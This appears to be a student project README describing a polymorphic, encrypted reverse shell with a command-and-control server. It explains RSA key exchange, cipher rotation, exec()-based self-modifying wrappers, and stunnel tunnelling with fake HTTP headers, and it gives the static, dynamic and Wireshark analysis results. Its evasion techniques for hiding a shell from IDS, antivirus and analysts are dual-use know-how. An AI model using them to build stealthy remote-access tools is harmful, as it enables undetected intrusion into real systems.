<details id="how-polymorphic-encryption-contributes-to-the-overall-resilience-of-the-SSH-reverse-shell-against-detection">
<summary>How Polymorphic Encryption Contributes to the Overall Resilience of the SSH Reverse Shell Against Detection</summary>

- Polymorphic encryption strengthens the shell's stealth in the following ways:
    - **Encrypted Payloads Change Every Time**:
        - Messages use random encryption wrappers and algorithm switching.
        - Even if the command is identical (e.g. `whoami`), the ciphertext looks different each time.
    - **Session Keys Are Unique**:
        - Every session generates a new symmetric key and uses RSA to exchange it securely.
        - This ensures past traffic can't be reused or matched via pattern analysis.
    - **Algorithm Switching During Runtime**:
        - Automatically rotates encryption algorithms every 15–30 seconds.
        - Manual `rotate` command allows dynamic transitions during active sessions.
        - These changes affect ciphertext structure, making detection rules brittle.
    - **Disrupts IDS Pattern Matching**:
        - Network monitoring tools often rely on known payloads or binary patterns.
        - Because payloads are encrypted, short-lived, and always different, they evade static rules.
    - **Obfuscation Amplified by `stunnel` and Fake HTTP Headers**:
        - Payloads are embedded inside HTTPS-like tunnels and mimic real HTTP request structure before encryption.
        - In packet captures (Wireshark), this blends with real TLS traffic and hides the shell.

</details>

<details id="trade-offs-between-security-enhancement-and-potential-risks-associated-with-polymorphic-techniques">
<summary>Trade-offs Between Security Enhancement and Potential Risks Associated with Polymorphic Techniques</summary>

- **Benefits:**
    - **✅ Evasion from Detection Tools**
        - Polymorphic behaviour (e.g. wrapper variation, encryption switching) makes it difficult for intrusion detection systems (IDS), antivirus scanners, or sandbox analysis to identify repeatable patterns.
    - **✅ Unpredictable Payload Structure**
        - Each command-response exchange appears different, even with repeated usage — defeating content-based traffic signatures.
- **Risks and Drawbacks:**
    - **⚠️ Reduced Maintainability**
        - The introduction of randomized runtime logic (e.g. with `exec()` and dynamic wrappers) increases code complexity, which can make debugging more difficult and slow down development.
    - **⚠️ False Positives from Defensive Tools**
        - Self-modifying behaviour can be flagged by endpoint protection software as suspicious or malicious, even when used for legitimate educational or red-team purposes.
    - **⚠️ Testing Challenges**
        - Since encrypted outputs differ every time, reproducing issues or verifying correctness can be harder without extensive logging or debug markers.
- **Summary:**
    - While polymorphic techniques significantly enhance stealth and variation, they must be carefully designed and documented to remain understandable and testable. In this project, each technique was added in a controlled way, and logs/debug flags were preserved to maintain traceability.

</details>

<details id="rationale-behind-the-chosen-encryption-algorithms-and-key-generation-methods">
<summary>Rationale Behind the Chosen Encryption Algorithms and Key Generation Methods</summary>

- **Symmetric Algorithms Used:**
    - The shell supports **4 symmetric algorithms** chosen for variety, modern support, and education value:

        | Algorithm    | Type                    | Key Size          | Why It Was Chosen                        |
        | ------------ | ----------------------- | ----------------- | ---------------------------------------- |
        | **AES**      | Block cipher (CBC)      | 256 bits          | Industry standard, fast, and secure      |
        | **ChaCha20** | Stream cipher with AEAD | 256 bits          | Modern and secure on low-power devices;  | 
        |              |                         |                   | avoids timing attacks                    |
        | **Camellia** | Block cipher (CBC)      | 256 bits          | AES-alternative with wide support        |
        |              |                         |                   | in Japan/EU crypto standards             |
        | **3DES**     | Block cipher (CBC)      | 192 bits (3 × 56) | Legacy algorithm, included for backward  |
        |              |                         |                   | compatibility and demonstration purposes |

    - Encryption is rotated every 15–30 seconds (timer-based), or manually via the `rotate` command.
    - This ensures that ciphertext structure and entropy vary even in the same session.

- **Key Generation and Exchange:**
    - **Session Key (Symmetric):**
        - Generated using `secrets.token_bytes(32)` in the victim before encryption begins.
        - Ensures every session uses a completely unique key.
        - Never hardcoded, never reused.
    - **RSA Key Exchange:**
        - Attacker generates an RSA 2048-bit key pair at runtime using the `cryptography` library.
        - The public key is sent to the victim.
        - The victim encrypts the symmetric session key with RSA-OAEP and sends it back.
        - Only the attacker can decrypt the session key using their private key.
- **Why This Ensures Uniqueness and Security:**
    - Every session has:
        - New symmetric key
        - Freshly generated RSA key pair (attacker side)
        - Random algorithm selection and rotation
    - There are no static keys or reused initialization vectors.
    - Even if a session is captured, it cannot be decrypted without the private key and the ephemeral session key — and both are discarded after the session ends.

</details>

<details id="initial-key-exchange-process">
<summary>Initial Key Exchange Process</summary>

- The reverse shell uses **RSA-based asymmetric encryption** to securely perform initial key exchange:
    1. **Attacker generates a new RSA key pair** at startup (2048-bit) using the `cryptography` library.
    2. **Public key is sent** to the reverse shell client (target).
    3. The reverse shell client generates a **fresh 256-bit session key** using `secrets.token_bytes(32)`.
    4. The client encrypts this session key with the attacker's RSA public key using **RSA-OAEP padding** (secure against chosen ciphertext attacks).
    5. The attacker receives the encrypted session key and decrypts it with their private RSA key.
    6. The attacker sends the **chosen encryption algorithm** (e.g. AES, ChaCha20) to the client.

- Once this exchange is complete, both sides use the shared symmetric session key to encrypt all further communication.

- **Why this is secure:**
    - The session key is never sent in plaintext.
    - The public key can safely be shared — only the attacker can decrypt the session key using their private key.
    - There are no hardcoded values or fixed secrets — every session is fresh.
    - RSA with OAEP ensures padding oracle and replay protection during key transmission.

</details>

<details id="how-data-integrity-is-maintained">
<summary>How Data Integrity is Maintained</summary>

- To ensure the shell remains robust and messages are safely decrypted even as encryption methods change dynamically:
    - **Per-Message Structure**
        - All messages are:
            - Encrypted using the **current algorithm and shared session key**.
            - Base64-encoded before sending, ensuring safe transmission over sockets and preventing corruption due to binary characters.

    - **Supported Modes and Integrity Behaviour**
        | Algorithm             | Encryption Mode                 | Integrity Features                           |
        | --------------------- | ------------------------------- | ---------------------------------------------|
        | **ChaCha20-Poly1305** | AEAD (authenticated encryption) | ✅ Integrity guaranteed via Poly1305 MAC     |
        | **AES-CBC**           | CBC with PKCS7 padding          | ⚠️ No built-in integrity — relies on correct |
        |                       |                                 | key/session                                  |
        | **Camellia-CBC**      | CBC with PKCS7 padding          | ⚠️ Same as AES                               |
        | **3DES-CBC**          | CBC with PKCS7 padding          | ⚠️ Same — legacy, but controlled use         |

    - **Dynamic Algorithm Rotation**
        - The attacker can send a `SWITCH:<algorithm>` command mid-session.
        - Both attacker and client update their encryption method in sync.
        - Session key remains the same — ensuring seamless switching without loss of continuity.
    - **Summary**
        - **Data is never exposed in plaintext**
        - **Session keys are securely exchanged per session**
        - **Dynamic encryption method rotation does not break decryption, even mid-session**
        - **ChaCha20-Poly1305 provides strong integrity checking by default**, and other algorithms rely on good session management and base64 encapsulation to prevent corruption.

</details>

<details id="how-encoding-process-handles-various-data-types-and-potential-edge-cases">
<summary>How Encoding Process Handles Various Data Types and Potential Edge Cases</summary>

- Encrypted outputs from symmetric algorithms (AES, ChaCha20, etc.) are binary, which may include null bytes, newline characters, and non-printable bytes.
- To safely transmit this data over the network, the application **Base64-encodes** all ciphertext before sending.
    - `base64.b64encode(...)` on the sender side.
    - `base64.b64decode(...)` on the receiver side.
- Base64 encoding ensures that the payload is transmitted using **only ASCII-safe characters** — avoiding corruption due to newline interpretation, socket buffer flushing issues, or terminal encoding mismatches.
- This encoding process is applied **uniformly** across all supported encryption algorithms, ensuring compatibility and consistency.
- The system can handle:
    - Text with multibyte UTF-8 characters (e.g. ä, é, ñ).
    - Binary outputs (e.g. `hexdump` output, binary file reads).
    - Large outputs from commands like `ls -laR /` by chunking correctly.
- This encoding step is critical to avoid unexpected behaviour when dealing with encrypted shell output, and ensures full compatibility across platforms and Python versions.

</details>

<details id="how-consistent-functionality-is-ensured-despite-code-self-modifying">
<summary>How Consistent Functionality is Ensured Despite Code Self-modifying</summary>

- The reverse shell uses **runtime-generated encryption/decryption wrappers** to simulate **polymorphic self-modifying code**.
- These wrappers are:
    - Either pre-defined templates with small randomized transformations (e.g. string reversals, dummy loops).
    - Or generated dynamically at runtime using Python's `exec()` to simulate a code mutation engine.
- **How it works:**
    - Before each message is encrypted or decrypted, a **random wrapper function** is selected using `build_random_encryption_wrapper(...)` or `build_random_decryption_wrapper(...)`.
    - All wrappers internally call a **shared encryption method** (e.g. `aes_encrypt()`), which ensures consistency and correctness.
    - The outer wrappers may mutate variable names, inject unused logic, or even be generated from scratch using a code string compiled with `exec()`.
- **Why functionality is never broken:**
    - Wrappers only modify the *path to execution*, not the actual encryption logic.
    - All inputs/outputs remain standard: `encrypt(plaintext, method, password)` → `ciphertext`.
    - Extensive testing confirms that regardless of the randomly selected wrapper:
        - The same input produces a consistent encrypted output (under the same method + key).
        - The reverse shell runs uninterrupted even across hundreds of encrypted command executions.
- **Result:**
    - The tool achieves **per-message polymorphism** at runtime.
    - It avoids detection by altering its execution behaviour constantly.
    - It never sacrifices reliability, because encryption and decryption are **abstracted and isolated** from the mutation logic.

</details>

<details id="static-analysis-findings-and-interpretation">
<summary>Static Analysis Findings and Interpretation</summary>

- I used <a href="https://bandit.readthedocs.io/en/latest/">Bandit</a> to perform static analysis on the entire codebase (`shell/` and `server/`) from my WSL development environment.

- **Summary of Actionable Results**: 

    | Severity  | Bandit ID | What it Flagged                 | Is it a Real Issue?                       | Action                                                    |
    | --------- | --------- | ------------------------------- | ----------------------------------------- | --------------------------------------------------------- |
    | 🟠 High   | **B304**  | 3DES encryption                 | ✅ Yes, deprecated                       | Kept for bonus, documented the risk                       |
    | 🟠 High   | **B605**  | `subprocess.getoutput(command)` | ✅ Yes, possible injection               | Acceptable here, documented as intentionally risky        |
    | 🟡 Medium | **B104**  | Binding to `0.0.0.0`            | ⚠️ Yes, security risk                    | Acceptable for attacker server, documented as intentional |
    | 🟡 Medium | **B102**  | Use of `exec()`                 | ✅ Yes, high risk                        | Kept for polymorphism, it's controlled                    |
    | 🟢 Low    | **B311**  | Use of `random` module          | ✅ Yes, but only if used for crypto keys | Used `secrets` for keys                                   |
    | 🟢 Low    | **B404**  | Importing `subprocess`          | ⚠️ Generic warning                       | Acceptable in this context                                |

- **Key findings included**:
    - Use of `exec()` to generate encryption/decryption wrappers (`polymorph.py`): flagged as risky, but **intentionally included** for educational demonstration of self-modifying code. Carefully scoped and controlled.
    - Use of deprecated **3DES** cipher (`encryption.py`): flagged as insecure; included intentionally for demonstration purposes and documented as such.
    - Use of `random` module for algorithm selection: flagged for weak entropy. However, **cryptographic key generation already uses `secrets.token_bytes()`**, which is secure.
    - Binding to `0.0.0.0` on attacker server: flagged for exposing all interfaces. In this project, it is an intentional and necessary choice because the attacker's machine acts as a **Command and Control (C2)** server, which must accept incoming connections from the victim machine regardless of IP address or interface. This setup is common in reverse shell and red team tooling and is safe within a controlled lab environment, though it would not be appropriate in a production network.
    - Use of `subprocess.getoutput()` for command execution: flagged due to potential shell injection. This is **expected and required** in a reverse shell. Proper input sanitization is not applied as the attacker controls the commands.
    - Import of `subprocess`: general informational warning.
- **Next steps taken**:
    - Reviewed each flagged item and validated its necessity or accepted risk.
    - Added comments and README notes to explain intentional security tradeoffs.
    - Ensured that all critical cryptographic components use secure practices (`secrets`, `cryptography`).
    - I deliberately did not use `# nosec` annotations to suppress any Bandit warnings. Even in cases where the flagged code is acceptable in this controlled context (e.g. binding to `0.0.0.0` for C2 testing, or using `exec()` for polymorphic behaviour), I chose to leave the warnings visible to ensure **transparency** .
- **Conclusion**:
    - All flagged issues are either justified by design, contained within safe boundaries, or intentionally left in to demonstrate polymorphic flexibility and obfuscation.
    - No hardcoded secrets or unsafe practices were found in core logic.
    - Bandit's results support the claim that the reverse shell demonstrates polymorphic behaviour while managing its risk profile carefully.

</details>

<details id="dynamic-analysis-findings">
<summary>Dynamic Analysis Findings</summary>

- Dynamic analysis was conducted using `strace` (`strace -f -o strace1.log`) on the reverse shell client in Ubuntu VM across multiple sessions to observe low-level system behaviour.
- Dynamic analysis confirmed runtime changes in execution flow, memory use, and syscall sequences across sessions, validating the shell's polymorphic behaviour.

- **Summary of Findings:**

    | Runtime Evidence        | Example                                    |
    | ----------------------- | ------------------------------------------ |
    | Unique session keys     | `getrandom` call per launch                |
    | Dynamic memory use      | `mmap`, `munmap` variation                 |
    | Encrypted communication | `sendto()` → binary + base64 blobs         |
    | Wrapper logic changes   | Random use of `exec()` + varied call stack |
    | Socket activity         | Changing data sizes and payload patterns   |

- Each time the reverse shell is executed, the client uses the OS's secure cryptographic randomness (`getrandom`) to create a unique RSA session key, ensuring no reuse across sessions.
- Encrypted traffic is confirmed by examining Base64-encoded, non-readable blobs in `sendto()` and `recvfrom()` calls.
- The logs revealed differences in memory allocation (`mmap`), dynamic function evaluation (`exec`), and socket traffic patterns, aligning with the randomized wrapper generation and encryption method switching.
- System calls like `read`, `write`, and `futex` appeared in varying orders and byte sizes across sessions, further demonstrating the dynamic control flow and runtime mutation.
- While `strace` cannot reveal internal Python logic, dynamic behaviour like algorithm switching and runtime wrapper generation is observed through code structure and debug logs.
- Despite these dynamic changes, the core reverse shell functionality remained stable and reliable throughout multiple tests.
- These findings validate that the application behaves differently across sessions and adapts continuously during execution — a hallmark of effective polymorphic behaviour.

</details>

<details id="network-traffic-analysis-findings">
<summary>Network Traffic Analysis Findings</summary>

- Wireshark was used on the attacker (Kali VM) to capture the network traffic during reverse shell operation.

- **Summary of Findings:**

    | Observation                     | Description                                                                 |
    |---------------------------------|-----------------------------------------------------------------------------|
    | TCP communication on port 4545  | Raw encrypted traffic without `stunnel`, visible as base64 blobs            |
    | TLS handshake on port 4747      | When `stunnel` is used, traffic is wrapped in TLS with no visible payload   |
    | Payload variation per session   | Different packet sizes and contents, even for same commands                 |
    | No plaintext commands visible   | All payloads are encrypted and encoded before transmission                  |

- All communication between attacker and target occurs over a TCP socket on port 4545.
- The captured packets contain Base64-encoded encrypted payloads; no plaintext commands or output were observable in transit.
- Each session generates a unique RSA encryption key using `secrets.token_bytes()` and switches between multiple algorithms (AES, ChaCha20, Camellia, 3DES) mid-session.
- Traffic was verified to vary across sessions in terms of packet sizes and contents, confirming the polymorphic nature of encryption and session key use.
- These findings confirm that the communication is encrypted, polymorphic, and resilient to simple traffic inspection or pattern matching.
- When `stunnel` is used, all traffic is tunneled through TLS. Wireshark shows standard `TLSv1.3` handshake packets, followed by encrypted `Application Data` blocks, making the shell traffic visually indistinguishable from regular HTTPS.
- `.pcapng` files have been saved under `/reports/` as evidence of encrypted communication and per-session variation, and screenshots can be found under `/screenshots/`.

</details>

<details id="algorithm-switching-process">
<summary>Algorithm Switching Process</summary>

- During each active session, the reverse shell can switch between the following symmetric encryption algorithms:
    - `AES` (CBC mode)
    - `ChaCha20` (with Poly1305)
    - `Camellia` (CBC mode)
    - `3DES` (CBC mode; included for demonstration purposes)
- **Two switching mechanisms** are supported:
    1. **Manual**: The attacker can issue a `rotate` command to cycle to the next algorithm.
    2. **Automatic**: A background timer on the attacker's side triggers a `SWITCH:<ALGONAME>` control message every 15–30 seconds.
- The attacker sends a `SWITCH:<ALGONAME>` string over the encrypted socket.
    - This is detected by the client and triggers an immediate change to the specified algorithm.
    - Both attacker and client update their internal `current_algorithm` variable.
- Example:
    ```
    Attacker sends: SWITCH:CAMELLIA
    Client receives and switches to CAMELLIA
    All further encryption/decryption uses CAMELLIA
    ```
- Seamless switching is possible because:
    - The shared session key remains the same.
    - Encryption is stateless across messages (no chaining between commands).
    - Wrapper functions abstract the logic and allow the algorithm to change cleanly.

</details>

<details id="how-encryption-rotation-maintains-security-and-integrity">
<summary>How Encryption Rotation Maintains Security and Integrity</summary>

- The application supports live algorithm rotation without interrupting or corrupting ongoing communication.
- A single session uses one RSA-encrypted key exchange at the beginning to establish a shared symmetric session key.
- This session key is reused across all encryption methods — only the algorithm applied to that key changes.
- **Integrity is preserved because:**
    - Algorithm switches are only applied between command messages, not mid-message.
    - Base64 encoding ensures all encrypted messages remain socket-safe and decoding-safe, even with binary differences between algorithms.
    - Each message is treated independently — padding, IV generation, and encryption occur fresh for each message, so switching algorithms does not rely on or affect previous ciphertexts.
- **Confirmed via testing:**
    - Commands sent just before and after a switch still decrypt properly.
    - No message corruption or out-of-sync errors occur during rapid switching.
    - Traffic captured in Wireshark confirms different payload sizes and ciphertext structures after each switch.

</details>

<details id="traffic-obfuscation-and-protocol-mimicry"> 
<summary>Traffic Obfuscation and Protocol Mimicry</summary>

- Considered and evaluated multiple obfuscation tools and techniques: 

    | Tool           | Disguise Type                  | Detectable as                                 | Complexity   | Still Maintained?   | Notes                                                          |
    | -------------- | ------------------------------ | --------------------------------------------- | ------------ | ------------------- | -------------------------------------------------------------- |
    | **obfs4proxy** | Custom transport (Tor-based)   | Looks like random noise (hard to fingerprint) | ⚠️ High      | ✅ Yes (via Tor)   | Requires integration with Tor or bridge setup                  |
    | **meek**       | Domain fronting over HTTPS     | Real HTTPS (via CDN proxy)                    | 🔥 Very High | ✅ Yes             | Routes traffic through real CDNs (like Google/AppEngine)       |
    | **ShadowTLS**  | TLS mimic (bypasses detection) | Looks like normal TLS                         | ✅ Medium    | ✅ Yes             | High-performance obfuscation tool for censorship circumvention |
    | **stunnel**    | TLS tunneling                  | Looks like HTTPS                              | ✅ Easy      | ✅ Yes             | Great for simulating encrypted HTTPS-like sessions             |
    | **obfsproxy**  | Legacy (obfs2/obfs3)           | Looks obfuscated                              | ✅ Easy      | ❌ No (deprecated) | Still works, good for demos                                    |
    | **socat**      | Generic TCP redirect           | No disguise                                   | ✅ Easy      | ✅ Yes             | Doesn't obfuscate, just reroutes                               |
    | **Tor**        | Full anonymization             | Encrypted Tor traffic                         | ⚠️ Very High | ✅ Yes             | Not obfuscation per se, but can use obfs4/meek                 |

- **Technique Overview:**
    - The reverse shell is obfuscated using two layers of deception:
        1. **TLS Tunnel via `stunnel`**
            - Traffic is routed through a TLS connection on port 4747, which makes it look like **HTTPS traffic** in packet captures.
            - The underlying unencrypted reverse shell server (`attacker_server.py` on port 4545) is completely hidden.
        2. **Fake HTTP Headers**
            - Before each payload is encrypted, the tool prepends fake HTTP headers like:
                ```
                POST /api/endpoint HTTP/1.1
                Host: example.com
                User-Agent: Mozilla/5.0
                Content-Type: application/json
                Content-Length: ...
                ```
            - This structure mimics actual **POST request** metadata and increases the illusion that the payload is HTTP.
    - Together, these steps ensure the reverse shell traffic **resembles normal HTTPS activity** — even under packet capture.

- **Traffic Capture Demonstration (Wireshark)**
    - You can inspect the traffic in Wireshark:
        1. Start capturing on `tcp.port == 4747`
        2. Run the reverse shell and type a few commands (e.g. `ls`, `pwd`)
        3. Stop the capture and inspect the stream
    - What you will see:
        - TLS handshake packets:
            - `Client Hello`, `Server Hello`, `Encrypted Handshake`
        - `Application Data` packets (encrypted)
        - TCP payload sizes that vary depending on command length
        - No readable content or shell commands — just Base64 blobs
        - No metadata identifying this as a reverse shell
    - What you won't see:
        - Clear-text commands
        - Any identifiable shell signature
        - Signs of command injection or exploits

- **Why I Chose TLS+HTTP**
    - TLS is the most **common encrypted protocol** in use (e.g. HTTPS, SMTPS, IMAPS), so it blends in with real traffic.
    - Fake HTTP headers **further increase plausibility** in the event that decrypted payloads are logged or intercepted inside controlled networks.
    - `stunnel` was selected for ease of setup, cross-platform support, and mature implementation.

</details>

<details id="network-footprint-evasion"> 
<summary>How the Application Blends with Normal Network Traffic</summary>

- **The reverse shell traffic does not stand out** in terms of port, protocol, packet size, or frequency:
    - Uses **TCP port 4747** — appears like HTTPS
    - Handshakes resemble **standard TLSv1.3**
    - Payloads are **uniformly encrypted** and encoded
    - Packet sizes vary, **mimicking real HTTP POST/response lengths**
- **Avoids suspicious patterns:**
    - No bursts of identical packet sizes
    - No repeated plaintext values
    - No unusual protocol use like custom binary formats
- When captured in Wireshark, even a trained analyst would interpret the session as:
    > "Typical HTTPS communication from a local app sending JSON to a remote API."
- **Real-world example:**
    - User inspecting `stunnel-reverse-shell-capture1.pcapng` or `stunnel-reverse-shell-capture2-stunnel.pcapng` will see clean TLS traces with no alerts or unusual flags.

</details>

---

## Author :construction_worker:
Henna Venho